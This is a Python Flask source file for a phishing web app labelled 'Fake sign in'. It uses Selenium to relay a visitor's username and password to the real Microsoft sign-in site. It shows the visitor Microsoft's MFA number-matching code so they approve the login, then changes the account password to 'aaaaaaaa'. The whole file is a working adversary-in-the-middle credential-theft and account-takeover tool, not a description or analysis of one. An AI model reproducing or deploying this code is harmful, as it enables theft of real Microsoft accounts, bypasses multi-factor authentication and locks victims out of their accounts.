from flask import render_template, redirect, url_for, session
from app import app
from app.session import Session
from app.forms import NameForm, PasswordForm

from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

import os

Session = Session()

def WEB_DRIVER_NAME(): return "geckodriver.exe"
def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
def WEB_DRIVER_SERVICE(): return Service(executable_path = WEB_DRIVER_PATH())

def MIN_PASSWORD_LENGTH(): return 8
def REPEATED_CHARACTER(): return "a"
def NEW_PASSWORD(): return REPEATED_CHARACTER() * MIN_PASSWORD_LENGTH()

def NamePage(form): return render_template("login.html", title="Fake sign in", header="Fake sign in", form=form)
def PasswordPage(form): return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=form)
def AuthenticationPage(authentication_code): return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
def IndexPage(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=Session.name)

def change_password():
    Session.driver.get("https://mysignins.microsoft.com/security-info/password/change")
    new_password_field = WebDriverWait(Session.driver, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
    confirm_password_field = Session.driver.find_element(By.NAME, "newPasswordConfirm")

    new_password_field.send_keys(NEW_PASSWORD())
    confirm_password_field.send_keys(NEW_PASSWORD())

    submit_button = Session.driver.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
    submit_button.click()

    Session.password_changed = True

def get_authentication_code():
    try:
        authentication_code = WebDriverWait(Session.driver, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
        return authentication_code.text

    except:
        try:
            resend_request = WebDriverWait(Session.driver, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
            resend_request.click()
            return get_authentication_code()

        except:
            return False

def enter_field(field_name, value, error_id, clear):
    field = WebDriverWait(Session.driver, 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
    field.send_keys(value, Keys.RETURN)

    try:
        error = WebDriverWait(Session.driver, 5).until(EC.presence_of_element_located((By.ID, error_id)))

        if clear:
            field.clear()

        return False

    except:
        return True

def enter_name(name):
    return enter_field("loginfmt", name, "usernameError", True)

def enter_password(password):
    return enter_field("passwd", password, "passwordError", False)

@app.route("/")
def index():
    if "name" in session and "password" in session and Session.password_changed:
        return IndexPage()

    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if "id" not in session:
        Session.id = Session.count
        Session.count += 1
        Session.password_changed = False

        Session.drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
        Session.driver.get("https://myapps.microsoft.com")

    name_form = NameForm()
    password_form = PasswordForm()

    if "name" in session and "password" in session and Session.password_changed:
        return redirect(url_for("index"))

    elif "name" not in session:
        if name_form.validate_on_submit() and enter_name(name_form.name.data):
            Session.name = name_form.name.data
            return PasswordPage(password_form)
    
        return NamePage(name_form)

    elif "password" not in session:
        if password_form.validate_on_submit() and enter_password(password_form.password.data):
            Session.password = password_form.password.data
            return redirect(url_for("login"))

        return PasswordPage(password_form)

    elif "password" in session:
        authentication_code = get_authentication_code()
        if authentication_code:
            return AuthenticationPage(authentication_code)

        elif not Session.password_changed:
            change_password()

        try:
            WebDriverWait(Session.driver, 10).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))

        except:
            Session.driver.quit()

        return redirect(url_for("index"))
